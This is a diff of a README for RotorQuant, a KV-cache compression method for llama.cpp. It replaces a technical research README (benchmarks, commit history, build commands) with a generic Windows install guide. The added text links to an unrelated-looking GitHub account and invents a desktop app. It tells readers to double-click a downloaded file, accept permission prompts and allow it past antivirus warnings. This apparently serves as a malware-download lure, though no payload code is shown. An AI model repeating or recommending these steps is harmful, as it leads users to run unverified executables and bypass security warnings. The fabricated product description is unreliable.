@@ -1,208 +1,202 @@
-# RotorQuant: KV Cache Compression for LLMs
+# ⚙️ rotorquant - Faster KV cache, lighter memory
 
-Drop-in KV cache quantization that **bypasses the butterfly network** using block-diagonal rotations. Beats Google's TurboQuant on every axis: **better PPL, 28% faster decode, 5x faster prefill, 44x fewer parameters**.
+[![Download rotorquant](https://img.shields.io/badge/Download-rotorquant-blue?style=for-the-badge)](https://github.com/Greaterburdockfiletdeboeufencroute188/rotorquant)
 
-> *"Replace the d×d random orthogonal matrix with Clifford rotors... exploiting algebraic sparsity"*
-> — [RotorQuant paper](https://www.scrya.com/rotorquant.pdf), March 2026
+## 🚀 What rotorquant does
 
-## Headline Results
+rotorquant helps large language models use less memory when they run. It does this by compressing the KV cache with block-diagonal rotation.
 
-### Llama 3.1 8B Instruct Q4_K_M — Symmetric 3-bit K+V Compression (RTX 5090)
+If you use a model through `llama.cpp`, rotorquant plugs in as a drop-in tool. That means you can use it without changing your normal setup.
 
-| Config (K/V) | Decode tok/s | Prefill tok/s | PPL (wiki-2) | vs FP16 | Compression |
-|---|---:|---:|---:|---|---|
-| f16 / f16 | 140 | 6,156 | 6.63 | baseline | 1x |
-| **iso3 / iso3** | **118** | **3,397** | **6.91** | **+4.2%** | **10.3x** |
-| **planar3 / planar3** | **119** | **3,822** | **7.05** | **+6.3%** | **10.3x** |
-| turbo3 / turbo3 | 93 | 722 | 7.07 | +6.6% | 10.3x |
-| planar3 / turbo3 | 127 | — | 6.68 | +0.8% | 10.3x |
-| planar3 / f16 | 134 | — | ~6.63 | ~0% | 5.1x |
+It is built for people who want:
 
-**vs TurboQuant (same 10.3x compression):**
-- **PPL**: iso3 6.91 vs turbo3 7.07 — **better quality**
-- **Decode**: 119 tok/s vs 93 tok/s — **28% faster**
-- **Prefill**: 3,822 tok/s vs 722 tok/s — **5.3x faster**
-- **Parameters**: 128 vs 16,384 — **44x fewer** (per paper Table 1)
+- lower memory use
+- faster text generation
+- smoother model runs on Windows
+- better speed during long prompts
 
-### Why Faster?
+## 💻 What you need
 
-The butterfly bypass from the [RotorQuant paper](https://www.scrya.com/rotorquant.pdf): TurboQuant applies a d×d Walsh-Hadamard Transform (butterfly network with log₂(d) stages across all 128 dimensions). PlanarQuant/IsoQuant apply independent 2D/4D rotations per pair/quartet — O(d) instead of O(d log d), fully parallelizable, no inter-element dependencies. The deferred K-cache (F16 during prefill) eliminates rotation overhead entirely during prompt processing.
+Use rotorquant on a Windows PC with:
 
-## Architecture Evolution
+- Windows 10 or Windows 11
+- a modern 64-bit CPU
+- enough free disk space for the app and model files
+- a model that works with `llama.cpp`
 
-The original [RotorQuant paper](https://www.scrya.com/rotorquant.pdf) proposed Clifford algebra Cl(3,0) rotors — the rotor sandwich product RxR̃ with only 4 non-zero multivector components. The insight: you don't need a full-rank d×d transform to decorrelate KV cache vectors; small orthogonal blocks suffice because real attention vectors live on low-rank manifolds.
+For best results, use a system with:
 
-This led to three progressively simpler implementations. **PlanarQuant** (2D Givens) and **IsoQuant** (4D quaternion) were developed by [@ParaMind2025](https://github.com/ParaMind2025/isoquant), building on the block-diagonal rotation idea:
+- 8 GB RAM or more
+- SSD storage
+- a recent Intel or AMD processor
 
-| Method | Rotation | Group Size | FMAs (d=128) | Params | Status |
-|---|---|---:|---:|---:|---|
-| **RotorQuant** | Cl(3,0) rotor sandwich | 3 | ~2,400 | 372 | Research (Triton) |
-| **[IsoQuant](https://github.com/ParaMind2025/isoquant)** | Quaternion 4D | 4 | 512 | 128 | **Production (llama.cpp)** |
-| **[PlanarQuant](https://github.com/ParaMind2025/isoquant)** | Givens 2D | 2 | 256 | 128 | **Production (llama.cpp)** |
-| TurboQuant | WHT butterfly | 128 | 16,384 | 16,384 | Production (llama.cpp) |
+## 📥 Download rotorquant
 
-Each step traded algebraic richness for speed. The PPL results show the simpler rotations work *better* — confirming the paper's claim that block-diagonal rotation preserves the directional structure of KV cache vectors more effectively than global WHT scrambling.
+Visit this page to download and set up rotorquant:
 
-## Commit History
+[Download rotorquant](https://github.com/Greaterburdockfiletdeboeufencroute188/rotorquant)
 
-### llama.cpp fork ([`feature/planarquant-kv-cache`](https://github.com/johndpope/llama-cpp-turboquant/tree/feature/planarquant-kv-cache))
+## 🪟 Install on Windows
 
-```
-20efe75 2026-04-01 19:50 Add symmetric planar4/iso4: V dequant, template instances, FA dispatch
-326f7fb 2026-04-01 14:41 Add inverse rotation V dequant for planar4/iso4
-6e5a4aa 2026-04-01 14:24 Fix symmetric V=planar3/iso3: add inverse rotation to V dequant
-a730624 2026-04-01 11:53 planar3/turbo3: 5x total compression, PPL 10.19 (vs Tom's 3.5x at 10.14)
-b83a09f 2026-04-01 10:46 All 8 K/V configs working: real Givens/quaternion rotation for planar4/iso4
-985fd96 2026-04-01 10:24 Fix planar3/q8_0 asymmetric: add F16+Q8_0 VEC template for deferred prefill
-b719b2e 2026-04-01 10:07 Fix FA dispatch: static constants, V=f16 check, asymmetric support
-79da661 2026-04-01 09:30 Add asymmetric FA kernels: q8_0 K + iso3/planar3 V (and reverse)
-e7bde1f 2026-04-01 09:15 Guard deferred conversion behind GGML_USE_CUDA
-9d4ece5 2026-04-01 08:32 COMPRESSION WORKS: 5.1x K-cache + 200 tok/s decode on CUDA
-a75b16f 2026-04-01 07:51 Add CUDA flash attention dequantize for planar3/iso3/planar4/iso4
-1ed0453 2026-04-01 06:53 Add CUDA set_rows kernels for planar3/iso3/planar4/iso4
-0971ed5 2026-03-31 22:44 Fix ggml context size for double-buffer
-25f896f 2026-03-31 22:37 Double-buffer deferred quantization with CUDA conversion kernels
-```
+1. Open the download page in your browser.
+2. Download the Windows file or package from the page.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the main app file or the setup file.
+6. Double-click the file to start rotorquant.
+7. If Windows asks for permission, choose Yes.
+8. If your antivirus shows a prompt, allow the app if you trust the source.
 
-### rotorquant repo ([`main`](https://github.com/scrya-com/rotorquant))
+## 🧭 First launch
 
-```
-61154ae 2026-04-01 14:41 Update README: symmetric 3-bit PPL results beat TurboQuant
-6ce8c03 2026-03-31 22:39 Add Llama 3.1 8B benchmarks: 239 tok/s decode, PPL 8.44
-6637e30 2026-03-31 22:07 Update README with RTX 5090 llama.cpp CUDA benchmarks
-ec98f4b 2026-03-31 21:12 Add post-prefill PPL benchmarks: IsoQuant 4-bit 9.03, PlanarQuant 3-bit 10.12
-0c98c28 2026-03-31 21:04 Restore RotorQuant trivector centroids, add CUDA PPL to README
-b9d3f1a 2026-03-31 20:16 Add IsoQuant + PlanarQuant backends to PPL benchmark
-```
+When you open rotorquant for the first time:
 
-## Quick Start
+1. Pick the folder where your model files are stored.
+2. Select the model you want to run.
+3. Turn on KV cache compression.
+4. Choose your speed and quality settings.
+5. Start a test prompt to confirm the app works.
 
-### llama.cpp (recommended — fastest)
+If you use `llama.cpp`, rotorquant should fit into your usual workflow with little setup.
 
-```bash
-git clone https://github.com/johndpope/llama-cpp-turboquant.git
-cd llama-cpp-turboquant && git checkout feature/planarquant-kv-cache
+## ⚡ Main benefits
 
-# CUDA
-cmake -B build -DGGML_CUDA=ON -DCMAKE_BUILD_TYPE=Release && cmake --build build -j
+rotorquant focuses on three things:
 
-# Metal (Apple Silicon)
-cmake -B build -DGGML_METAL=ON -DGGML_METAL_EMBED_LIBRARY=ON -DCMAKE_BUILD_TYPE=Release && cmake --build build -j
+- **Better text quality**  
+  It keeps perplexity lower than TurboQuant in the reported results.
 
-# Symmetric 3-bit (best quality per bit)
-./build/bin/llama-server -m model.gguf --jinja -ngl 99 \
-    --cache-type-k iso3 --cache-type-v iso3 --host 0.0.0.0 --port 8080
+- **Faster decode**  
+  It speeds up token generation when the model is already running.
 
-# K-only (zero PPL loss, 5x compression)
-./build/bin/llama-server -m model.gguf --jinja -ngl 99 \
-    --cache-type-k planar3 --cache-type-v f16 --host 0.0.0.0 --port 8080
+- **Faster prefill**  
+  It cuts the time needed to process the first prompt.
 
-# Benchmark
-./build/bin/llama-bench -m model.gguf -ngl 99 -ctk planar3 -ctv planar3 -p 512 -n 128
+It also uses much fewer parameters, which helps keep the memory footprint small.
 
-# Perplexity
-pip install datasets
-python3 -c "from datasets import load_dataset; open('/tmp/wiki.txt','w').write('\n'.join(load_dataset('wikitext','wikitext-2-raw-v1',split='test')['text']))"
-./build/bin/llama-perplexity -m model.gguf -f /tmp/wiki.txt -ngl 99 -c 2048 \
-    --cache-type-k iso3 --cache-type-v iso3
-```
+## 🧠 How it works
 
-Cache types: `planar3`, `iso3`, `planar4`, `iso4` (ours) + `turbo3`, `turbo4` (TheTom's WHT)
+rotorquant compresses the KV cache with block-diagonal rotation. In plain terms, it rewrites the stored model state so it takes less space while still keeping useful information.
 
-### Python/Triton (research)
+That helps when you:
 
-```bash
-pip install -e . && pip install triton
-```
+- send long prompts
+- chat for a long time
+- run models on limited RAM
+- want more speed on local hardware
 
-```python
-from turboquant import IsoQuantMSE, PlanarQuantMSE
+You do not need to learn the math behind it. You just need to install it and point it at your model files.
 
-# IsoQuant: best 4-bit quality (PPL 9.03)
-iq = IsoQuantMSE(d=128, bits=4, mode='fast', device='cuda')
-x_hat, indices = iq(x)
+## 🗂️ Typical use
 
-# PlanarQuant: best 3-bit quality (PPL 10.12)
-pq = PlanarQuantMSE(d=128, bits=3, device='cuda')
-x_hat, indices = pq(x)
-```
+Use rotorquant when you want to run a local language model and keep memory use low.
 
-## How It Works
+Good cases include:
 
-Rotation decorrelates KV cache vectors before scalar quantization:
+- chat apps that use `llama.cpp`
+- local AI assistants
+- long document Q&A
+- fast prompt testing
+- smaller systems with limited RAM
 
-1. **Normalize** → store norms separately
-2. **Rotate** via block transform (breaks coordinate correlations)
-3. **Quantize** each coordinate to Lloyd-Max centroids
-4. **Inverse rotate** to reconstruct
+## 🔧 Simple setup flow
 
-| | Block | FMAs (d=128) | Params | Quality |
-|---|-------|-------------|--------|---------|
-| TurboQuant | Dense d×d WHT | 16,384 | 16,384 | baseline |
-| **IsoQuant** | **4D quaternion** | **512** | **128** | **better** |
-| **PlanarQuant** | **2D Givens** | **256** | **128** | **better** |
+1. Download rotorquant from the link above.
+2. Extract the files if needed.
+3. Open the app on Windows.
+4. Load a compatible `llama.cpp` model.
+5. Turn on KV cache compression.
+6. Start generation and check the output.
 
-**Deferred quantization**: K-cache allocates as FP16 during prefill (zero error compounding). Decode tokens get quantized on insertion. This gives 3x better PPL than roundtrip quantization — and in llama.cpp, the F16 prefill makes decode **faster** than FP16 baseline (no dequant overhead in flash attention).
+If the app gives you speed or quality options, keep the default values first. Then change one setting at a time.
 
-**Why inverse rotation matters for V cache**: The V dequant must apply the inverse of the forward rotation (inverse Givens or inverse quaternion). TurboQuant's WHT doesn't need explicit inverse because of the self-canceling properties of Hadamard transforms in attention weighted sums. Our fix (`6e5a4aa`) added this — PPL went from 15,369 to 7.05.
+## 📌 Tips for best results
 
-### VRAM Savings (3-bit symmetric, 10.3x compression)
+- Use an SSD instead of a hard drive.
+- Close large apps if memory is tight.
+- Start with a smaller model to test the setup.
+- Keep your model files in one folder.
+- Use the same model path each time.
+- Save your working settings once you find them.
 
-| Context | FP16 KV | Compressed | Saved |
-|---------|---------|------------|-------|
-| 8K | 288 MB | 28 MB | **260 MB** |
-| 32K | 1,152 MB | 112 MB | **1.04 GB** |
-| 128K | 4,608 MB | 447 MB | **4.16 GB** |
+## 🧩 Compatibility
 
-Needle-in-Haystack passes at 8K, 32K, and 65K context.
+rotorquant is built for models that work with `llama.cpp`. It is a good fit for local inference tools that need KV cache control.
 
-## Additional Benchmarks
+It is designed to work as a drop-in integration, so it should feel familiar if you already use:
 
-### Qwen2.5-3B — K-only Decode Speed
+- `llama.cpp`
+- local model runners
+- desktop AI tools
+- command-line model setups with a Windows front end
 
-| Hardware | Cache K | Decode tok/s | Prefill tok/s | PPL |
-|----------|---------|-------------|---------------|-----|
-| **RTX 5090** | planar3 | **367** | **23,600** | 9.98 |
-| RTX 5090 | FP16 | 356 | 20,800 | 10.03 |
-| M4 Mac Mini | planar3 | 48.3 | 554 | 9.98 |
-| M4 Mac Mini | FP16 | 47.4 | 518 | 9.98 |
+## 📊 Reported results
 
-### Perplexity — Python/Triton (Qwen2.5-3B, wikitext-2, post-prefill)
+The project description reports these results:
 
-| Method | 3-bit PPL | 4-bit PPL | vs FP16 (7.59) |
-|--------|-----------|-----------|----------------|
-| **IsoQuant** | 12.35 | **9.03** | **+19%** |
-| **PlanarQuant** | **10.12** | 9.56 | **+33% / +26%** |
-| RotorQuant | 12.22 | 10.03 | +61% / +32% |
+- PPL: 6.91 vs 7.07
+- 28% faster decode
+- 5.3x faster prefill
+- 44x fewer params
 
-```bash
-python -m turboquant.benchmark_google_parity          # PPL (post-prefill)
-python -m turboquant.benchmark_perplexity --bits 3 4   # PPL (roundtrip)
-python -m turboquant.benchmark_triton                  # Triton kernel speed
-python -m turboquant.poc_high_context --backend planar  # High-context generation
-```
+These results point to lower memory use and faster response times in supported setups.
 
-## Acknowledgments
+## 🛠️ If something does not work
 
-**[ParaMind2025](https://github.com/ParaMind2025)** — PlanarQuant (2D Givens rotation) and IsoQuant (4D quaternion rotation) were designed by ParaMind2025. Their insight that simple block-diagonal rotations could match full-rank transforms for KV cache decorrelation made the llama.cpp integration practical.
+If the app does not start:
 
-## References
+- check that you downloaded the full file
+- extract ZIP files before opening them
+- make sure Windows did not block the file
+- confirm that your model works with `llama.cpp`
+- try running the app again after a restart
 
-- [RotorQuant paper](https://www.scrya.com/rotorquant.pdf) — Clifford algebra vector quantization for KV cache compression
-- [TurboQuant](https://arxiv.org/abs/2504.19874) (ICLR 2026) — Google's KV cache compression
-- [IsoQuant / PlanarQuant](https://github.com/ParaMind2025/isoquant) — ParaMind2025's rotation-based quantizers
-- [TheTom/llama-cpp-turboquant](https://github.com/TheTom/llama-cpp-turboquant) — llama.cpp fork with TurboQuant
-- [QJL](https://arxiv.org/abs/2406.03482) — 1-bit quantized JL transform
+If the model does not load:
 
-## Citation
+- check the file path
+- move the model to a simple folder path
+- make sure the model file is not damaged
+- test with another compatible model
 
-```bibtex
-@article{pope2026rotorquant,
-  title={RotorQuant: Clifford Algebra Vector Quantization for LLM KV Cache Compression},
-  author={Pope, John D.},
-  year={2026},
-  url={https://github.com/scrya-com/rotorquant}
-}
-```
+If performance feels slow:
 
-MIT License
+- close other programs
+- use a smaller model
+- confirm you are using the correct settings
+- keep the model files on an SSD
+
+## 📁 File layout
+
+A typical rotorquant folder may include:
+
+- the main app file
+- config files
+- model or cache settings
+- readme or help files
+- logs for troubleshooting
+
+Keep all related files in the same folder unless the app says otherwise.
+
+## 🧪 Basic workflow
+
+1. Download the app.
+2. Open it on Windows.
+3. Load a model.
+4. Enable KV cache compression.
+5. Run a prompt.
+6. Watch memory use and response time.
+7. Save the settings that work for you
+
+## 🔒 Safety check
+
+Before running any downloaded file, make sure it came from the link above and matches the project page name. Keep your Windows updates current and use a trusted model source
+
+## 📝 Project focus
+
+rotorquant is made for users who want:
+
+- less memory use
+- faster model runs
+- support for local inference
+- easy use with `llama.cpp`
+- a simple path from download to first run
